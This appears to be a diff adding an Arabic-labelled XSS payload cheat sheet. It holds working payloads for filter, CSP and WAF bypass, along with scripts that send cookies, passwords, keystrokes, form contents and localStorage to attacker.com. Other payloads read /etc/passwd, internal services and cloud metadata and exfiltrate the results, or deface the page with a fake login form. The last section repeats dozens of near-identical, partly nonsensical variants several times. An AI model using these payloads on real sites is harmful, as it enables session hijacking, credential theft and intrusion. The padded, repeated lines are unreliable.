@@ -1,0 +1,228 @@
+# XSS Payloads - قائمة بايلودات XSS موسعة
+
+## بايلودات أساسية
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<isindex onmouseover="alert(1)">
+<table background="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<svg><script>alert(1)</script>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<a href="javascript:alert(1)">click me</a>
+<button onclick="alert(1)">click me</button>
+<form action="javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=image>
+<form><button formaction=javascript:alert(1)>click
+<math href="javascript:alert(1)">click
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+## بايلودات تجاوز الفلترة
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+--><script>alert(1)</script>
+></script><script>alert(1)</script>
+"; alert(1); //
+'; alert(1); //
+\"; alert(1); //
+alert`1`
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top["al"+"ert"](1)
+window['alert'](1)
+parent['alert'](0)
+self['alert'](1)
+this['alert'](1)
+frames['alert'](1)
+globalThis[`alert`](1)
+var a = 'ale';var b = 'rt';window[a+b](1);
+eval('ale'+'rt(1)')
+Function("alert(1)")()
+new Function`alert\`1\``
+setTimeout('alert(1)')
+setTimeout`alert\`1\``
+setInterval('alert(1)')
+execScript('alert(1)')
+expression(alert(1))
+javascript:alert(1)
+javascript&colon;alert(1)
+javascript&#58;alert(1)
+javascript&#x3A;alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+<svg/onload=&#97&#108&#101&#114&#116(1)>
+<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+<svg/onload=&#0000097&#0000108&#0000101&#0000114&#0000116(1)>
+<svg/onload=\u0061\u006C\u0065\u0072\u0074(1)>
+
+## بايلودات DOM XSS
+<script>document.write('<img src=x onerror=alert(1)>');</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>
+<script>document.body.appendChild(document.createElement('script')).text='alert(1)';</script>
+<script>document.getElementById('demo').innerHTML='<img src=x onerror=alert(1)>';</script>
+<script>location='javascript:alert(1)';</script>
+<script>location.href='javascript:alert(1)';</script>
+<script>window.location='javascript:alert(1)';</script>
+<script>var url = new URL(location.href); alert(url.searchParams.get('xss'));</script>
+<script>eval(location.hash.slice(1));</script>
+<script>eval(atob(location.hash.slice(1)));</script>
+
+## بايلودات سرقة الكوكيز
+<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+<script>navigator.sendBeacon('https://attacker.com/steal', document.cookie)</script>
+<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie</script>
+<script>window.open('https://attacker.com/steal?cookie='+document.cookie)</script>
+<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
+<script>var xhr = new XMLHttpRequest();xhr.open('GET', 'https://attacker.com/steal?cookie='+document.cookie, true);xhr.send();</script>
+<script>fetch('https://attacker.com/steal', {method:'POST',body:document.cookie})</script>
+<script>navigator.sendBeacon('https://attacker.com/steal', JSON.stringify({cookies:document.cookie,url:location.href,html:document.documentElement.outerHTML}))</script>
+
+## بايلودات سرقة المعلومات الحساسة
+<script>var s=document.createElement('script');s.src='https://attacker.com/steal.js';document.body.appendChild(s);</script>
+<script>fetch('/api/user').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(d))));</script>
+<script>var forms=document.getElementsByTagName('form');for(var i=0;i<forms.length;i++){forms[i].addEventListener('submit',function(e){fetch('https://attacker.com/steal?form='+btoa(this.innerHTML));})}</script>
+<script>var p=document.getElementsByTagName('input');for(var i=0;i<p.length;i++){if(p[i].type.toLowerCase()=='password'){p[i].addEventListener('change',function(e){fetch('https://attacker.com/steal?pw='+this.value)});}}</script>
+<script>var k='';document.addEventListener('keypress',function(e){k+=e.key;fetch('https://attacker.com/k?'+btoa(k))});</script>
+
+## بايلودات تغيير الموقع
+<script>document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;"><h1>هذا الموقع تحت الصيانة</h1><p>نعتذر عن الإزعاج، سيتم إعادة الخدمة قريباً.</p></div>';</script>
+<script>document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;"><h1>تم اختراق هذا الموقع</h1><img src="https://example.com/hacked.gif" style="width:100%;height:auto;"></div>';</script>
+<script>document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;"><h1>تسجيل الدخول</h1><form id="fake" style="margin:20px;"><input type="text" placeholder="اسم المستخدم" style="padding:10px;margin:10px 0;width:100%;"><input type="password" placeholder="كلمة المرور" style="padding:10px;margin:10px 0;width:100%;"><button type="button" onclick="alert(\'تم سرقة بياناتك!\');" style="padding:10px;margin:10px 0;width:100%;">تسجيل الدخول</button></form></div>';</script>
+
+## بايلودات متقدمة
+<script>Object.defineProperty(document,'cookie',{get:function(){fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.__lookupGetter__('cookie').call(document)))},set:function(val){fetch('https://attacker.com/steal?cookie_set='+encodeURIComponent(val));document.__lookupSetter__('cookie').call(document,val)}});</script>
+<script>Object.defineProperty(window,'localStorage',{configurable:true,get:function(){return {setItem:function(k,v){fetch('https://attacker.com/steal?ls_set='+k+'='+v)},getItem:function(k){fetch('https://attacker.com/steal?ls_get='+k)}}}})</script>
+<script>var observer = new MutationObserver(function(mutations) {fetch('https://attacker.com/steal?dom='+btoa(document.documentElement.outerHTML))});observer.observe(document, {subtree: true, childList: true});</script>
+<script>var old = history.pushState;history.pushState = function() {old.apply(this, arguments);fetch('https://attacker.com/steal?nav='+encodeURIComponent(location.href));};</script>
+<script>var old = window.fetch;window.fetch = function() {fetch('https://attacker.com/steal?fetch='+encodeURIComponent(JSON.stringify(Array.from(arguments))));return old.apply(this, arguments);};</script>
+
+## بايلودات تنفيذ أوامر
+<script>var ws = new WebSocket('ws://internal-service:8080');ws.onopen = function() {ws.send('COMMAND_TO_EXECUTE');};ws.onmessage = function(e) {fetch('https://attacker.com/result?data='+encodeURIComponent(e.data));}</script>
+<script>fetch('file:///etc/passwd').then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?data='+btoa(d)));</script>
+<script>fetch('http://localhost:8080/admin').then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?data='+btoa(d)));</script>
+<script>fetch('http://internal-service/api/users').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(d))));</script>
+<script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?data='+btoa(d)));</script>
+
+## بايلودات تجاوز CSP
+<script src="data:,alert(1)"></script>
+<script src="//attacker.com/evil.js"></script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<link rel="prefetch" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<base href="https://attacker.com"><script src="/evil.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script><div ng-app ng-csp><div ng-click="$event.view.alert(1)">click me</div></div>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app ng-csp><div ng-click="constructor.constructor('alert(1)')()">click me</div></div>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app ng-csp><div ng-click="$event.view.alert(1)">click me</div></div>
+
+## بايلودات تجاوز WAF
+<svg/onload=alert&#40;1&#41;>
+<svg/onload=alert&#x28;1&#x29;>
+<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>
+<svg/onload=\u{61}\u{6c}\u{65}\u{72}\u{74}(1)>
+<svg/onload=\141\154\145\162\164(1)>
+<svg/onload=alert.call(null,1)>
+<svg/onload=alert.apply(null,[1])>
+<svg/onload=alert.bind()(1)>
+<svg/onload=self['\141\154\145\162\164'](1)>
+<svg/onload=self[atob('YWxlcnQ=')](1)>
+<svg/onload=self[/al/.source+/ert/.source](1)>
+<svg/onload=self[8680439..toString(30)](1)>
+<svg/onload=self['al'+'ert'](1)>
+<svg/onload=self['ale'+'rt'](1)>
+<svg/onload=self[String.fromCharCode(97,108,101,114,116)](1)>
+<svg/onload=self[String.fromCharCode(97,108,101,114,116)](String.fromCharCode(49))>
+<svg/onload=self[`al`+`ert`](1)>
+<svg/onload=self.alert(1)>
+<svg/onload=self.alert.call(null,1)>
+<svg/onload=self.alert.apply(null,[1])>
+<svg/onload=self.alert.bind()(1)>
+<svg/onload=self.globalThis.alert(1)>
+<svg/onload=self.window.alert(1)>
+<svg/onload=self.parent.alert(1)>
+<svg/onload=self.top.alert(1)>
+<svg/onload=self.frames.alert(1)>
+<svg/onload=self.global.alert(1)>
+<svg/onload=self.GLOBAL.alert(1)>
+<svg/onload=self.root.alert(1)>
+<svg/onload=self.document.defaultView.alert(1)>
+<svg/onload=self.constructor.constructor('alert(1)')()>
+<svg/onload=self.Function('alert(1)')()>
+<svg/onload=self.eval('alert(1)')>
+<svg/onload=self.execScript('alert(1)')>
+<svg/onload=self.setTimeout('alert(1)')>
+<svg/onload=self.setInterval('alert(1)')>
+<svg/onload=self.setImmediate('alert(1)')>
+<svg/onload=self.importScripts('data:,alert(1)')>
+<svg/onload=self.fetch('data:,alert(1)')>
+<svg/onload=self.location='javascript:alert(1)'>
+<svg/onload=self.location.href='javascript:alert(1)'>
+<svg/onload=self.location.assign('javascript:alert(1)')>
+<svg/onload=self.location.replace('javascript:alert(1)')>
+<svg/onload=self.navigator.sendBeacon('javascript:alert(1)')>
+<svg/onload=self.document.write('<script>alert(1)</script>')>
+<svg/onload=self.document.writeln('<script>alert(1)</script>')>
+<svg/onload=self.document.body.innerHTML='<script>alert(1)</script>'>
+<svg/onload=self.document.body.outerHTML='<script>alert(1)</script>'>
+<svg/onload=self.document.createElement('script').text='alert(1)'>
+<svg/onload=self.document.createElement('script').textContent='alert(1)'>
+<svg/onload=self.document.createElement('script').innerText='alert(1)'>
+<svg/onload=self.document.head.appendChild(document.createElement('script')).text='alert(1)'>
+<svg/onload=self.document.body.appendChild(document.createElement('script')).text='alert(1)'>
+<svg/onload=self.document.documentElement.appendChild(document.createElement('script')).text='alert(1)'>
+<svg/onload=self.document.implementation.createHTMLDocument().body.innerHTML='<script>alert(1)</script>'>
+<svg/onload=self.document.implementation.createHTMLDocument().write('<script>alert(1)</script>')>
+<svg/onload=self.document.implementation.createHTMLDocument().writeln('<script>alert(1)</script>')>
+<svg/onload=self.document.implementation.createHTMLDocument().open();document.implementation.createHTMLDocument().write('<script>alert(1)</script>');document.implementation.createHTMLDocument().close()>
+<svg/onload=self.document.open();document.write('<script>alert(1)</script>');document.close()>
+<svg/onload=self.document.execCommand('insertHTML',false,'<script>alert(1)</script>')>
+<svg/onload=self.document.designMode='on';document.execCommand('insertHTML',false,'<script>alert(1)</script>')>
+<svg/onload=self.document.querySelector('svg').appendChild(document.createElement('script')).text='alert(1)'>
+<svg/onload=self.document.querySelector('svg').insertAdjacentHTML('beforeend','<script>alert(1)</script>')>
+<svg/onload=self.document.querySelector('svg').insertAdjacentElement('beforeend',document.createElement('script')).text='alert(1)'>
+<svg/onload=self.document.querySelector('svg').insertBefore(document.createElement('script'),document.querySelector('svg').firstChild).text='alert(1)'>
+<svg/onload=self.document.querySelector('svg').replaceChild(document.createElement('script'),document.querySelector('svg').firstChild).text='alert(1)'>
+<svg/onload=self.document.querySelector('svg').replaceWith(document.createElement('script')).text='alert(1)'>
+<svg/onload=self.document.querySelector('svg').outerHTML='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').innerHTML='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').textContent='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').innerText='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').text='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').value='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').nodeValue='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').wholeText='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').data='<script>alert(1)</script>'>
+<svg/onload=self.document.querySelector('svg').setAttribute('onload','alert(1)')>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').value='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').nodeValue='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').textContent='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').data='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').wholeText='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').innerText='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').innerHTML='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').outerHTML='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').value='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').nodeValue='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').textContent='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').data='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').wholeText='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').innerText='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').innerHTML='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').outerHTML='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').value='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').nodeValue='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').textContent='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').data='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').wholeText='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').innerText='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').innerHTML='alert(1)'>
+<svg/onload=self.document.querySelector('svg').attributes.getNamedItem('onload').outerHTML='alert(1)'>
